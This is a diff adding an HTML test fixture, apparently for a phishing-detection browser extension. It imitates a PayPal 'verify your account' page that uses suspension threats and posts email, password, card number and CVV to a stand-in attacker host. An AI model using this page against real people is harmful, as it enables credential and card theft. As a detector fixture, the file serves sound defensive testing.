@@ -1,0 +1,71 @@
+<!doctype html>
+<!--
+  ============================================================================
+  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
+  Static fixture used by the LocalPhish extension test harness.
+  Imitates a PayPal "account verification" credential-harvest page.
+  All brand marks are property of their respective owners; defensive use only.
+  ============================================================================
+-->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>PayPal — Verify your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body { margin: 0; font-family: 'Helvetica Neue', system-ui, sans-serif; background: #f5f7fa; color: #2c2e2f; }
+      header { background: white; padding: 18px 24px; border-bottom: 1px solid #e5e7eb; }
+      .logo { font-size: 22px; font-weight: 700; }
+      .logo .pay { color: #003087; }
+      .logo .pal { color: #009cde; }
+      .card { max-width: 480px; margin: 40px auto; background: white; padding: 36px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.06); }
+      h1 { font-size: 22px; font-weight: 500; margin: 0 0 8px; }
+      .alert { background: #fff7ed; border: 1px solid #fdba74; border-radius: 6px; padding: 12px 14px; font-size: 13.5px; margin: 16px 0; }
+      label { display: block; font-size: 13px; margin: 16px 0 6px; }
+      input { width: 100%; padding: 12px; border: 1px solid #cbd5e0; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
+      input:focus { outline: 2px solid #0070ba; border-color: #0070ba; }
+      button { width: 100%; margin-top: 24px; background: #0070ba; color: white; border: 0; padding: 12px; border-radius: 24px; font-size: 15px; font-weight: 600; cursor: pointer; }
+      .legalese { font-size: 11px; color: #6b7280; margin-top: 18px; }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="logo"><span class="pay">Pay</span><span class="pal">Pal</span></div>
+    </header>
+    <main class="card">
+      <h1>Verify your account to restore access</h1>
+      <p>Hi customer,</p>
+      <p>
+        We detected unauthorized activity on your account. To protect you, we have
+        temporarily limited the following:
+      </p>
+      <ul>
+        <li>Send and receive money</li>
+        <li>Withdraw funds to your bank</li>
+        <li>Change account settings</li>
+      </ul>
+      <div class="alert">
+        <strong>Time-sensitive:</strong> please verify within 24 hours or your account
+        will be permanently suspended.
+      </div>
+
+      <!--
+        Action posts to an unrelated host; collects email + password + full
+        card number + CVV — every credential-harvest signal in one page.
+      -->
+      <form action="https://secure-paypal-recovery.example-bad.zip/submit" method="post">
+        <label>PayPal email</label>
+        <input type="email" name="email" required />
+        <label>Password</label>
+        <input type="password" name="password" required />
+        <label>Card number</label>
+        <input type="text" name="card" inputmode="numeric" maxlength="19" required />
+        <label>Expiration (MM/YY) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CVV</label>
+        <input type="text" name="combined" placeholder="MM/YY  CVV" required />
+        <button type="submit">Verify and restore access</button>
+      </form>
+
+      <p class="legalese">© Copyright 1999-2026 PayPal. All rights reserved.</p>
+    </main>
+  </body>
+</html>
